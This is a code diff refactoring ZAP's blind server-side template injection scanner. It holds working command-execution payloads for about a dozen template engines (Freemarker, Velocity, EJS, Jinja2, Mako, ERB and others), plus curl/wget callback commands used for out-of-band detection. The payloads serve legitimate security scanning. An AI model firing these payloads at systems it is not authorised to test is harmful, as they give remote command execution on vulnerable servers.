@@ -22,6 +22,7 @@ package org.zaproxy.zap.extension.sstiscanner;
 import java.io.IOException;
 import java.net.SocketException;
 import java.util.HashSet;
+import java.util.concurrent.TimeUnit;
 import org.apache.log4j.Logger;
 import org.parosproxy.paros.Constant;
 import org.parosproxy.paros.core.scanner.AbstractAppParamPlugin;
@@ -42,47 +43,48 @@ public class SSTIBlindScanner extends AbstractAppParamPlugin {
     private static final String MESSAGE_PREFIX = "sstiscanner.sstiblindplugin.";
 
     private static final float ERROR_MARGIN = 0.9f;
-    private static final int SEC_TO_MILLISEC = 1000;
 
     // Most of the exploits have been created by James Kettle @albinowax and the Tplmap creator
-    // WARNING all the payloads that uses % need to quadruplicate the char to %%%%
 
-    private static final String[] java_command_exec_payloads = {
-        "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"%s\") }", // javaFreemarker https://portswigger.net/blog/server-side-template-injection
+    private static final String[] JAVA_COMMAND_EXEC_PAYLOADS = {
+        "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"X_COMMAND_X\") }", // javaFreemarker https://portswigger.net/blog/server-side-template-injection
         "#set($engine=\"\")\r\n"
-                + "#set($proc=$engine.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"%s\"))\r\n"
+                + "#set($proc=$engine.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"X_COMMAND_X\"))\r\n"
                 + "#set($null=$proc.waitFor())\r\n"
                 + "${null}" // javaVelocity
         // https://portswigger.net/blog/server-side-template-injection
     };
 
-    private static final String[] javascript_command_exec_payloads = {
-        "{{= global.process.mainModule.require('child_process').execSync('%s').toString() }}", // Javascript dot
-        "<%%%%= global.process.mainModule.require('child_process').execSync('%s').toString()%%%%>", // Javascript EJS
-        "#{global.process.mainModule.require('child_process').execSync('%s').toString()}", // Javascript jade
-        "{{range.constructor(\"return eval(\\\"global.process.mainModule.require('child_process').execSync('%s').toString()\\\")\")()}}" // Javascript Nunjucks
+    private static final String[] JAVASCRIPT_COMMAND_EXEC_PAYLOADS = {
+        "{{= global.process.mainModule.require('child_process').execSync('X_COMMAND_X').toString() }}", // Javascript dot
+        "<%= global.process.mainModule.require('child_process').execSync('X_COMMAND_X').toString()%>", // Javascript EJS
+        "#{global.process.mainModule.require('child_process').execSync('X_COMMAND_X').toString()}", // Javascript jade
+        "{{range.constructor(\"return eval(\\\"global.process.mainModule.require('child_process').execSync('X_COMMAND_X').toString()\\\")\")()}}" // Javascript Nunjucks
     };
 
-    private static final String[] php_command_exec_payloads = {
-        "{system(\"%s\")}", // PHP smarty
+    private static final String[] PHP_COMMAND_EXEC_PAYLOADS = {
+        "{system(\"X_COMMAND_X\")}", // PHP smarty
     };
 
-    private static final String[] python_command_exec_payloads = {
-        "{{\"\".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get(\"__builtins__\").get(\"__import__\")(\"subprocess\").check_output(\"%s\")}}", // python3 jinja2 possibly doesn't work
-        "${__import__(\"subprocess\").check_output(\"%s\", shell=True)}", // python Mako
-        "{{__import__(\"subprocess\").check_output(\"%s\", shell=True)}}", // Python Tornado
+    private static final String[] PYTHON_COMMAND_EXEC_PAYLOADS = {
+        "{{\"\".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get(\"__builtins__\").get(\"__import__\")(\"subprocess\").check_output(\"X_COMMAND_X\")}}", // python3 jinja2 possibly doesn't work
+        "${__import__(\"subprocess\").check_output(\"X_COMMAND_X\", shell=True)}", // python Mako
+        "{{__import__(\"subprocess\").check_output(\"X_COMMAND_X\", shell=True)}}", // Python
+        // Tornado
     };
 
-    private static final String[] ruby_command_exec_payloads = {
-        "<%%%%=%%%%x(%s)%%%%>", // Ruby ERB
-        "#{%%%%x(%s)}" // Ruby Slims
+    private static final String[] RUBY_COMMAND_EXEC_PAYLOADS = {
+        "<%=%x(X_COMMAND_X)%>", // Ruby ERB
+        "#{%x(X_COMMAND_X)}" // Ruby Slims
     };
 
-    private static final String[] ways_to_make_http_requests_cmd_line = {"curl %s", "wget %s"};
+    private static final String[] WAYS_TO_MAKE_HTTP_REQUESTS_CMD_LINE = {
+        "curl X_URL_X", "wget X_URL_X"
+    };
 
     private SSTIChallengeCallbackApi callbackAPI = new SSTIChallengeCallbackApi();
 
-    private static final Logger log = Logger.getLogger(SSTIBlindScanner.class);
+    private static final Logger LOG = Logger.getLogger(SSTIBlindScanner.class);
 
     @Override
     public boolean inScope(Tech tech) {
@@ -97,11 +99,6 @@ public class SSTIBlindScanner extends AbstractAppParamPlugin {
     @Override
     public String getName() {
         return Constant.messages.getString(MESSAGE_PREFIX + "name");
-    }
-
-    @Override
-    public String[] getDependency() {
-        return new String[] {};
     }
 
     @Override
@@ -150,39 +147,39 @@ public class SSTIBlindScanner extends AbstractAppParamPlugin {
             excludedTechnologies.add(t.getName());
         }
         if (!excludedTechnologies.contains("Java") /*inScope(Tech.Java)*/) {
-            sendPayloadsToMakeCallBack(paramName, java_command_exec_payloads);
-            timeBasedTests(paramName, java_command_exec_payloads);
+            sendPayloadsToMakeCallBack(paramName, JAVA_COMMAND_EXEC_PAYLOADS);
+            timeBasedTests(paramName, JAVA_COMMAND_EXEC_PAYLOADS);
         }
         if (!excludedTechnologies.contains("JavaScript") /*inScope(Tech.JavaScript)*/) {
-            sendPayloadsToMakeCallBack(paramName, javascript_command_exec_payloads);
-            timeBasedTests(paramName, javascript_command_exec_payloads);
+            sendPayloadsToMakeCallBack(paramName, JAVASCRIPT_COMMAND_EXEC_PAYLOADS);
+            timeBasedTests(paramName, JAVASCRIPT_COMMAND_EXEC_PAYLOADS);
         }
         if (!excludedTechnologies.contains("Python") /*inScope(Tech.Python*/) {
-            sendPayloadsToMakeCallBack(paramName, python_command_exec_payloads);
-            timeBasedTests(paramName, python_command_exec_payloads);
+            sendPayloadsToMakeCallBack(paramName, PYTHON_COMMAND_EXEC_PAYLOADS);
+            timeBasedTests(paramName, PYTHON_COMMAND_EXEC_PAYLOADS);
         }
         if (!excludedTechnologies.contains("Ruby") /*inScope(Tech.Ruby)*/) {
-            sendPayloadsToMakeCallBack(paramName, ruby_command_exec_payloads);
-            timeBasedTests(paramName, ruby_command_exec_payloads);
+            sendPayloadsToMakeCallBack(paramName, RUBY_COMMAND_EXEC_PAYLOADS);
+            timeBasedTests(paramName, RUBY_COMMAND_EXEC_PAYLOADS);
         }
         if (inScope(Tech.PHP)) {
-            sendPayloadsToMakeCallBack(paramName, php_command_exec_payloads);
-            timeBasedTests(paramName, php_command_exec_payloads);
+            sendPayloadsToMakeCallBack(paramName, PHP_COMMAND_EXEC_PAYLOADS);
+            timeBasedTests(paramName, PHP_COMMAND_EXEC_PAYLOADS);
         }
     }
 
     /**
      * Tries to inject template code that will cause a time delay in the case of being rendered
      *
-     * @param paramName the name of the parameter where to search for or injection
-     * @param command_exec_payloads the payloads that can possibly execute commands, they need to be
-     *     format strings
+     * @param paramName the name of the parameter where to search for our injection
+     * @param command_exec_payloads the payloads that can possibly execute commands, they need to
+     *     have the word X_COMMAND_X in the place where the command should be inserted
      */
     private void timeBasedTests(String paramName, String[] command_exec_payloads) {
 
         String payloadFormat;
         for (String sstiFormatPayload : command_exec_payloads) {
-            payloadFormat = String.format(sstiFormatPayload, "sleep %d");
+            payloadFormat = sstiFormatPayload.replace("X_COMMAND_X", "sleep X_SECONDS_X");
             checkIfCausesTimeDelay(paramName, payloadFormat);
         }
         // TODO make more requests using other ways of delaying a response
@@ -197,35 +194,40 @@ public class SSTIBlindScanner extends AbstractAppParamPlugin {
      */
     private void checkIfCausesTimeDelay(String paramName, String payloadFormat) {
 
-        String test2seconds = String.format(payloadFormat, 2);
+        String test2seconds = payloadFormat.replace("X_SECONDS_X", "2");
         HttpMessage msg = getNewMsg();
         setParameter(msg, paramName, test2seconds);
         try {
             sendAndReceive(msg, false);
             int time2secondsTest = msg.getTimeElapsedMillis();
 
-            if (time2secondsTest >= 2 * SEC_TO_MILLISEC * ERROR_MARGIN) {
+            if (time2secondsTest >= TimeUnit.SECONDS.toMillis(2) * ERROR_MARGIN) {
                 // If we detect a response that takes more time that the delay we tried to
                 // cause it is possible that our injection was successful but it also may
                 // have been caused by the network or other variable. So further testing is needed.
 
-                String sanityTest = String.format(payloadFormat, 0);
+                String sanityTest = payloadFormat.replace("X_SECONDS_X", "0");
                 msg = getNewMsg();
                 setParameter(msg, paramName, sanityTest);
                 sendAndReceive(msg, false);
                 int timeWithSanityTest = msg.getTimeElapsedMillis();
 
-                int sumTime = 1 + (time2secondsTest + timeWithSanityTest) / SEC_TO_MILLISEC;
-                String testOfSumSeconds = String.format(payloadFormat, sumTime);
+                int sumTime =
+                        (int)
+                                (1
+                                        + TimeUnit.MILLISECONDS.toSeconds(
+                                                time2secondsTest + timeWithSanityTest));
+                String testOfSumSeconds =
+                        payloadFormat.replace("X_SECONDS_X", Integer.toString(sumTime));
                 msg = getNewMsg();
                 setParameter(msg, paramName, testOfSumSeconds);
                 sendAndReceive(msg, false);
                 int timeSumSecondsTest = msg.getTimeElapsedMillis();
 
-                if (timeSumSecondsTest >= sumTime * SEC_TO_MILLISEC * ERROR_MARGIN) {
+                if (timeSumSecondsTest >= TimeUnit.SECONDS.toMillis(sumTime) * ERROR_MARGIN) {
                     String attack =
                             Constant.messages.getString(
-                                    MESSAGE_PREFIX + "alert.timedelay.attack",
+                                    MESSAGE_PREFIX + "alert.timedelay.otherinfo",
                                     testOfSumSeconds,
                                     paramName,
                                     msg.getRequestHeader().getURI().toString());
@@ -244,8 +246,8 @@ public class SSTIBlindScanner extends AbstractAppParamPlugin {
                 }
             }
         } catch (SocketException ex) {
-            if (log.isDebugEnabled())
-                log.debug(
+            if (LOG.isDebugEnabled())
+                LOG.debug(
                         "Caught "
                                 + ex.getClass().getName()
                                 + " "
@@ -253,7 +255,7 @@ public class SSTIBlindScanner extends AbstractAppParamPlugin {
                                 + " when accessing: "
                                 + msg.getRequestHeader().getURI().toString());
         } catch (IOException ex) {
-            log.warn(
+            LOG.warn(
                     "SSTI vulnerability check failed for parameter ["
                             + paramName
                             + "] and payload ["
@@ -283,17 +285,17 @@ public class SSTIBlindScanner extends AbstractAppParamPlugin {
         }
 
         int numberCommandsSent = 0;
-        for (String requestCmd : ways_to_make_http_requests_cmd_line) {
+        for (String requestCmd : WAYS_TO_MAKE_HTTP_REQUESTS_CMD_LINE) {
             if (numberCommandsSent >= allowedNumberCommands) {
                 break;
             }
             numberCommandsSent += 1;
             for (String sstiFormatPayload : command_exec_payloads) {
 
-                String payload = String.format(sstiFormatPayload, requestCmd);
+                String payload = sstiFormatPayload.replace("X_COMMAND_X", requestCmd);
                 String challenge = callbackAPI.generateRandomChallenge();
                 String url = callbackAPI.getCallbackUrl(challenge);
-                payload = String.format(payload, url);
+                payload = payload.replace("X_URL_X", url);
 
                 HttpMessage msg = getNewMsg();
                 setParameter(msg, paramName, payload);
@@ -302,8 +304,8 @@ public class SSTIBlindScanner extends AbstractAppParamPlugin {
                     callbackAPI.registerCallback(challenge, this, msg, payload, paramName);
                     sendAndReceive(msg, false);
                 } catch (SocketException ex) {
-                    if (log.isDebugEnabled())
-                        log.debug(
+                    if (LOG.isDebugEnabled())
+                        LOG.debug(
                                 "Caught "
                                         + ex.getClass().getName()
                                         + " "
@@ -312,7 +314,7 @@ public class SSTIBlindScanner extends AbstractAppParamPlugin {
                                         + msg.getRequestHeader().getURI().toString());
                     continue;
                 } catch (IOException ex) {
-                    log.warn(
+                    LOG.warn(
                             "SSTI vulnerability check failed for parameter ["
                                     + paramName
                                     + "] and payload ["
@@ -332,7 +334,7 @@ public class SSTIBlindScanner extends AbstractAppParamPlugin {
                 attackMessage.getRequestHeader().getURI().toString(),
                 paramName,
                 payload,
-                Constant.messages.getString(MESSAGE_PREFIX + "alert.recvdcallback.attack"),
+                Constant.messages.getString(MESSAGE_PREFIX + "alert.recvdcallback.otherinfo"),
                 attackMessage);
     }
 }
